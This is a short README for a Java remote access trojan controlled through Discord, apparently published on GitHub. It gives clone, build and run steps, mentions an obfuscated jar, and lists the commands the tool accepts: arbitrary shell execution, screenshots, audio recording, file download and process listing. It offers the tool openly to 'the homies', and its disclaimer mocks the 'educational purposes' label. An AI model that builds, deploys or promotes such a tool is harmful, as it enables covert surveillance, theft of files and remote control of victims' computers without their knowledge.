# discord rat

![](https://img.shields.io/badge/Java-af-orange?logo=openjdk)
![](https://img.shields.io/badge/License-do%20what%20u%20want-green)
![](https://img.shields.io/badge/Maven-lol-blue)

had this on private, fuck it. simple discord c2 rat for the homies.

## setup
```bash
git clone https://github.com/weessk/Discord-rat.git && cd Discord-rat
mvn clean package
```

make discord bot, paste TOKEN + CHANNEL_ID in rat.java, run it:
```bash
java -jar target/rat-obfuscated.jar
```

## commands
- `!info` - machine info
- `!cmd <command>` - run cmd commands  
- `!screenshot` - capture screen
- `!record <seconds>` - audio recording (1-30s)
- `!download <path>` - download files (8mb max)
- `!processes` - list running processes
- `!ip` - get public ip
- `!exit` - kill program

## requirements
java 8+, maven, discord bot token

## disclaimer
educational purposes only lol. get caught = skill issue on ur part.

## license
MIT - do whatever
